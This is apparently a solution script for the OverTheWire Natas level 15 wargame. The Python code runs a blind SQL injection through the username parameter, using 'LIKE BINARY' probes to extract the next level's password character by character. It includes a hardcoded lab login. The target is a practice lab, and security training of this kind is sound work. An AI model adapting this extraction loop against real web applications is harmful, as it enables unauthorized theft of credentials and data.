import requests, time

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

search_time = time.time()
print("Searching for password characters...")
# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our brute force attempts
password_dictionary = []
exists_str = "This user exists."
for char in characters:
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
    r = requests.get(uri, auth=(auth_username,auth_password))
    if exists_str in r.text:
        password_dictionary += [char]

print(f"Got password characters! Time: {time.time() - search_time}")
print(password_dictionary)
print("Finding password with brute force...")

password = "D"
counter = 0
right_done = False

last_time = time.time()
while len(password) != len(auth_password) or right_done:
    for char in password_dictionary:
        if time.time() - last_time > 10:
            uri = ''.join(
                [url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"%', char+password, '%', '&debug'])
            r = requests.get(uri, auth=(auth_username, auth_password))
            if exists_str in r.text:
                password = char + password
                print(password)
                break
        else:
            uri = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"%', password+char, '%', '&debug'])
            r = requests.get(uri, auth=(auth_username, auth_password))
            if exists_str in r.text:
                last_time = time.time()
                password += char
                print(password)
                break

print(f"Password is: {password}   time: {time.time() - search_time}")